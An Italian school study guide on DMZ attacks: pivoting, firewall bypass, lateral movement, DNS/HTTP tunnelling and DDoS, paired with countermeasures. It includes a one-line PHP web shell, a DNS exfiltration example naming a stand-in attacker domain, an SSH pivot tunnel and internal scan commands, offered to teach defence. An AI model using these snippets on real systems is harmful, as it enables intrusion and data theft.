# 01 — Attacchi alla DMZ: Pivot, Bypass, Lateral Movement e DDoS

> 📚 **Guida teorica** | Livello: 4ª–5ª superiore
> 🔗 Prerequisiti: Concetti base di networking, firewall, ACL
> ⏱️ Tempo di lettura: ~25 minuti

---

## 🏛️ Il Mito della DMZ Sicura

La DMZ (Demilitarized Zone) è nata come risposta alla necessità di esporre alcuni servizi su Internet mantenendo la LAN interna protetta. Il modello è intuitivo:

```
INTERNET  ──[Firewall]──  DMZ  ──[Firewall]──  LAN
(untrusted)                                  (trusted)
```

Tuttavia, molte organizzazioni cadono in un errore concettuale pericoloso: **considerare la DMZ come un "confine sicuro"** che divide il mondo ostile (Internet) dal mondo fidato (LAN). Questa visione è sbagliata per ragioni fondamentali:

| Mito | Realtà |
|------|--------|
| "I server DMZ sono sotto controllo" | I server DMZ eseguono software complesso con vulnerabilità non ancora scoperte |
| "Il firewall blocca gli attacchi" | Il firewall permette il traffico necessario per i servizi (HTTP, SMTP, DNS) — ed è proprio lì che si nascondono gli attacchi |
| "Se la DMZ è compromessa, la LAN è al sicuro" | **Senza contromisure specifiche**, un server DMZ compromesso ha spesso accesso diretto alla LAN |
| "La DMZ è separata dalla LAN" | In molte configurazioni, esistono flussi di gestione, backup e autenticazione che collegano DMZ e LAN |

> ⚠️ **Concetto chiave**: La DMZ **riduce** la superficie d'attacco, ma **non elimina** il rischio. Un attaccante che compromette un server DMZ ha ottenuto un **punto d'appoggio privilegiato** all'interno del perimetro aziendale.

---

## ⚔️ Pivot Attack: Anatomia di un Attacco a Più Stadi

### Definizione

Un **pivot attack** (detto anche "multi-stage attack" o "island hopping") è una tecnica in cui l'attaccante usa un sistema già compromesso come trampolino per attaccare sistemi che non sarebbero direttamente raggiungibili da Internet.

```
ATTACCANTE          DMZ                    LAN INTERNA
(Internet)
    │
    │ 1. Exploit
    │ vulnerabilità
    ▼ web
[Web Server]─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─▶[Server DB]
 compromesso        2. Ricognizione         3. Attacco
                       interna              laterale
```

### Le 5 Fasi del Pivot Attack

#### Fase 1 — Ricognizione Esterna 🔍

Prima di attaccare, l'avversario raccoglie informazioni:

- **Port scanning** su IP pubblici della DMZ (strumenti: nmap, masscan)
- **Banner grabbing**: identificare versioni dei software dai banner di risposta
  ```bash
  nc -v 203.0.113.10 80
  # Risposta: Server: Apache/2.4.29 (Ubuntu)
  # L'attaccante sa che Apache 2.4.29 ha CVE-XXXX-YYYY
  ```
- **Web fingerprinting**: identificare CMS, framework, tecnologie (Wappalyzer, WhatWeb)
- **DNS enumeration**: trovare sottodomini e servizi non noti (dnsrecon, dnsenum)
- **OSINT**: informazioni pubbliche su dipendenti, tecnologie (LinkedIn, Shodan, Censys)

#### Fase 2 — Compromissione del Server DMZ 💥

L'attaccante sfrutta una vulnerabilità per ottenere l'esecuzione di codice sul server:

- **SQL Injection** → lettura file, esecuzione OS commands
- **Remote Code Execution (RCE)** su CMS (WordPress, Joomla) non aggiornati
- **Upload di web shell**: carica un file PHP/ASP con funzioni `system()` o `exec()`
  ```php
  <!-- Web shell minimale — illustrativa -->
  <?php system($_GET['cmd']); ?>
  <!-- Uso: http://vittima.com/shell.php?cmd=id -->
  ```
- **Credential stuffing**: password di default su pannelli amministrativi

Dopo questa fase, l'attaccante ha una **shell remota** sul server DMZ.

#### Fase 3 — Ricognizione Interna dalla DMZ 🗺️

Dal server compromesso, l'attaccante esplora la rete interna:

```bash
# Port scan della LAN interna (dal server DMZ compromesso)
nmap -sS -T4 172.16.20.0/24

# ARP scan per trovare host attivi
arp-scan --interface=eth0 172.16.20.0/24

# Verifica connettività verso LAN
ping 172.16.20.1      # gateway LAN raggiungibile?
ping 172.16.20.20     # server DB raggiungibile?
```

> 🚨 **Segnale d'allarme**: Un web server che genera traffico di port scan verso la LAN è un chiaro indicatore di compromissione.

#### Fase 4 — Movimento Laterale verso LAN 🔀

L'attaccante si sposta dal server DMZ compromesso verso i sistemi LAN:

- **Direct connection**: se le ACL lo permettono, si connette direttamente
- **SSH tunneling**: crea un tunnel SSH attraverso il server DMZ
  ```bash
  ssh -L 3306:172.16.20.20:3306 attacker@dmz-server
  # Ora la porta 3306 del DB è accessibile localmente all'attaccante
  ```
- **SOCKS proxy**: usa il server DMZ come proxy per instradare tutto il traffico
- **Credential reuse**: le credenziali trovate nei file di configurazione del web server (es. password del DB in `config.php`) vengono provate su altri sistemi

#### Fase 5 — Escalation Privilegi e Persistenza 🔒

Una volta nella LAN, l'attaccante cerca di:

- Scalare ai privilegi di Administrator/root
- Installare **backdoor** per accesso persistente
- Estrarre dati (data exfiltration)
- Muoversi lateralmente verso altri sistemi LAN
- Installare **ransomware** o altri payload

---

## 🔓 Tecniche di Firewall Bypass

### 1. ACL Misconfiguration

La causa più comune di violazioni della DMZ non sono attacchi sofisticati: è una **regola sbagliata nel firewall**.

**Errori comuni**:

| Errore | Esempio | Impatto |
|--------|---------|---------|
| **Regola troppo permissiva** | `permit ip any any` invece di specificare porte | Tutto passa |
| **Implicit permit** | Dimenticare la `deny any any` finale | Traffico non previsto passa |
| **Shadow rule** | Una regola più specifica *dopo* una più generica (non viene mai valutata) | False sense of security |
| **Wildcard mask errata** | `0.0.0.255` invece di `0.0.0.31` per una /27 | Include subnet non previste |
| **Direzione sbagliata** | ACL applicata `out` invece di `in` | Non filtra il traffico in ingresso |

**Esempio di shadow rule**:
```cisco
ip access-list extended ACL-EXAMPLE
 permit tcp 172.16.10.0 0.0.0.255 any eq 80   ! regola generica
 deny tcp host 172.16.10.50 any eq 80           ! questa non viene MAI valutata!
 ! (host .50 rientra nella /24 → viene già permesso dalla prima regola)
```

### 2. IP Fragmentation Attack

I pacchetti IP possono essere frammentati in frammenti più piccoli. Alcuni firewall stateless ispezionano solo il **primo frammento** (che contiene l'header TCP/UDP con la porta), mentre i frammenti successivi passano senza ispezione.

```
Pacchetto originale:
[IP hdr][TCP hdr: dst port 80][Payload: "GET /admin HTTP/1.1..."]

Frammentato:
Frag 1: [IP hdr][TCP hdr: dst port 80][]     ← firewall vede porta 80 → PERMIT
Frag 2: [IP hdr][           ][Payload con exploit]  ← passa senza ispezione!
```

**Contromisura**: Firewall stateful con riassemblaggio dei frammenti prima dell'ispezione.

### 3. Covert Channel tramite Protocolli Permessi

Se il firewall permette DNS, HTTP o ICMP (e quasi sempre lo fa), un attaccante può usare questi protocolli per **esfiltrare dati** o **ricevere comandi** dal suo C2 (Command & Control server).

**DNS Tunneling**:
```
# Il malware sul server DMZ codifica i dati in query DNS:
# "exfil-dati.attacker.com" → contiene i dati in Base64 nel sottodominio
query DNS: YWRtaW46cGFzc3dvcmQ=.exfil.attacker.com
           └─ Base64 di "admin:password" ──────────────┘

# Il server DNS dell'attaccante riceve la query e decodifica i dati
```

**Strumenti noti**: iodine (DNS tunneling), dnscat2, DNSChef

**HTTP/HTTPS Tunneling**:
- Il malware usa richieste HTTP POST verso un server web dell'attaccante
- Il traffico appare come normale browsing
- Con HTTPS, è quasi impossibile ispezionare il contenuto senza SSL inspection

**ICMP Tunneling**:
- I dati vengono nascosti nel campo "data" dei pacchetti ICMP Echo (ping)
- Strumenti: ptunnel, icmpsh

### 4. Session Hijacking su ESTABLISHED

I firewall stateful che usano la keyword `established` verificano che i flag TCP ACK o RST siano presenti. Un attaccante sofisticato può forgiare pacchetti con questi flag per far sembrare il traffico come una "risposta" a una connessione già stabilita.

> 💡 **Per questo motivo**, su dispositivi critici si usa l'ispezione stateful completa (come `ip inspect` su IOS o iptables con conntrack) invece delle semplici ACL con `established`.

---

## 🔀 Lateral Movement da DMZ verso LAN

### Port Scanning Interno

Una volta all'interno della DMZ, l'attaccante mappa i sistemi LAN:

```
DMZ compromessa → nmap -sS -O -sV 172.16.20.0/24

Risultato:
172.16.20.10 open: 22(SSH), 3389(RDP), 445(SMB)    ← PC-Admin
172.16.20.20 open: 3306(MySQL), 5432(PostgreSQL)    ← Server-DB
172.16.20.30 open: 389(LDAP), 88(Kerberos)          ← Domain Controller
```

### Credential Reuse

I server web in DMZ spesso contengono file di configurazione con credenziali:

```php
// config.php (tipico file di configurazione web)
define('DB_HOST', '172.16.20.20');
define('DB_USER', 'webapp');
define('DB_PASSWORD', 'P@ssw0rd123');  // ← L'attaccante trova questa!
```

L'attaccante prova queste credenziali su:
- Il database server LAN direttamente
- SSH su altri server (le persone riusano le password)
- Il pannello di amministrazione del Domain Controller

### Pass-the-Hash e Pass-the-Ticket

Tecniche avanzate che non richiedono di conoscere la password in chiaro:

| Tecnica | Come funziona | Target |
|---------|--------------|--------|
| **Pass-the-Hash (PtH)** | Usa l'hash NTLM della password (trovato in memoria o file SAM) senza conoscere la password in chiaro | Windows NTLM authentication |
| **Pass-the-Ticket (PtT)** | Usa un ticket Kerberos rubato (TGT o TGS) per autenticarsi ai servizi | Windows Active Directory |

> ⚠️ Queste tecniche richiedono una compromissione iniziale su Windows. Sono menzionate perché molte LAN aziendali sono basate su Windows AD.

---

## 💣 DDoS sulla DMZ

### Attacchi Volumetrici

Obiettivo: **saturare la banda** o le risorse di connessione del server DMZ.

**SYN Flood**:
```
Attaccante → SYN (IP spoofato) → Server DMZ
Server DMZ → SYN-ACK → [IP inesistente, nessuna risposta]
Server DMZ → SYN-ACK → [IP inesistente, nessuna risposta]
... × 100.000 al secondo

Effetto: la tabella delle connessioni half-open si riempie → nessuna
         connessione legittima può essere stabilita
```

**Contromisure SYN Flood**:
- **SYN Cookies**: il server non alloca risorse finché non riceve l'ACK finale
- **Rate limiting**: limita il numero di SYN per secondo per IP sorgente
- **Upstream scrubbing**: il provider ISP filtra il traffico prima che arrivi

**UDP Flood**: invio massivo di pacchetti UDP su porte casuali → esaurisce CPU/banda

### Attacchi Applicativi

Operano al **Livello 7 (Applicazione)** e sono più difficili da rilevare perché il traffico appare legittimo.

| Attacco | Tecnica | Risorsa esaurita |
|---------|---------|-----------------|
| **HTTP Flood** | Migliaia di richieste GET/POST legittime | CPU, connessioni HTTP |
| **Slowloris** | Apre molte connessioni HTTP lentamente, non le chiude mai | Thread del web server |
| **RUDY** (R-U-Dead-Yet?) | POST con body inviato a velocità minima | Thread in attesa del body completo |
| **SSL/TLS Exhaustion** | Molte handshake TLS incomplete | CPU (negoziazione TLS è costosa) |

**Confronto**:
```
Attacco volumetrico: ████████████████████████ 100 Gbps traffic flood
Attacco applicativo: ──────── 10 Mbps ──────── (ma ogni richiesta è costosa)
```

### DNS/NTP Amplification (Abuso di Server in DMZ)

Un server DNS ricorsivo in DMZ mal configurato può essere usato **come arma** in un attacco DDoS contro terzi:

```
Attaccante              Server DNS DMZ           Vittima
    │                       │                      │
    │ Query DNS (IP         │                      │
    │ spoofato = vittima)   │                      │
    ├──────────────────────▶│                      │
    │                       │ Risposta amplificata │
    │                       │ (60× più grande!)    │
    │                       ├────────────────────▶ │
    │                       │                   FLOOD!

Amplification factor: Query 40 byte → Risposta 2400 byte (60×)
```

**Prevenzione**: Configurare il DNS in DMZ come **autoritative-only** (no recursion):
```bind
// named.conf - sezione options
options {
    recursion no;              // DISABILITA ricorsione
    allow-query { any; };      // risponde solo per le zone configurate
    allow-recursion { none; }; // nessuno può fare query ricorsive
};
```

---

## 📊 Tabella Riassuntiva degli Attacchi

| Attacco | Vettore di ingresso | Impatto CIA | Difficoltà rilevamento | Contromisura principale |
|---------|--------------------|---------|--------------------|------------------------|
| **Pivot Attack** | Vulnerabilità applicativa web | C, I, A | 🔴 Alta (sembra traffico legittimo) | ACL che bloccano DMZ→LAN; IDS comportamentale |
| **ACL Misconfiguration bypass** | Errore config. admin | C, I, A | 🔴 Molto alta (nessun IDS lo vede) | Audit ACL regolari; principio least privilege |
| **IP Fragmentation** | Pacchetti IP frammentati | C, I | 🟡 Media | Firewall stateful con reassembly |
| **DNS Tunneling** | Query DNS anomale | C | 🔴 Alta (traffico DNS spesso non ispezionato) | DNS-over-HTTPS inspection; anomaly detection DNS |
| **HTTP Tunneling** | Richieste HTTP(S) | C | 🔴 Alta (con HTTPS) | SSL inspection; DLP; anomaly detection |
| **Port Scan interno** | TCP SYN verso LAN | — (ricognizione) | 🟢 Bassa (alta frequenza SYN) | IDS/IPS; ACL blocco DMZ→LAN |
| **Credential Reuse** | File di configurazione | C, I | 🔴 Alta | Vault segreti; credenziali separate per zona |
| **Pass-the-Hash** | Accesso a memoria/SAM | C, I, A | 🔴 Alta | Windows Defender Credential Guard; PAM |
| **SYN Flood** | Volumetrico (L4) | A | 🟢 Bassa (volume anomalo) | SYN Cookies; rate limiting; upstream scrubbing |
| **HTTP Flood** | Applicativo (L7) | A | 🟡 Media | WAF; rate limiting per IP; CAPTCHA |
| **Slowloris** | Connessioni lente (L7) | A | 🟡 Media | Timeout connessioni; limite connessioni per IP |
| **DNS Amplification** | DNS ricorsivo in DMZ | A (DDoS su terzi) | 🟡 Media | DNS autoritative-only; RRL |
| **SQL Injection** | Input non sanificato | C, I | 🟡 Media | WAF; query parametrizzate; patch |
| **Web Shell Upload** | File upload non controllato | C, I, A | 🟡 Media | Validazione upload; HIDS; integrità file |

**Legenda CIA**:
- **C** = Confidentiality (riservatezza)
- **I** = Integrity (integrità)
- **A** = Availability (disponibilità)

---

## 🧪 Punti di Riflessione

> 💬 **Domanda 1**: Perché un attacco di "credential reuse" da DMZ verso LAN funziona così spesso nella realtà?

> 💬 **Domanda 2**: Un'azienda ha configurato correttamente il firewall con "blocco DMZ→LAN". Un attaccante che ha compromesso il web server può ancora raggiungere il DB interno? Come?
> *(Suggerimento: pensa al flusso legittimo web server → DB)*

> 💬 **Domanda 3**: DNS tunneling e HTTP tunneling usano protocolli "permessi". Come potresti distinguere il traffico DNS legittimo da quello usato per tunneling?

---

*01 — Attacchi alla DMZ | Guida Teorica ES07 | SISTEMI E RETI*
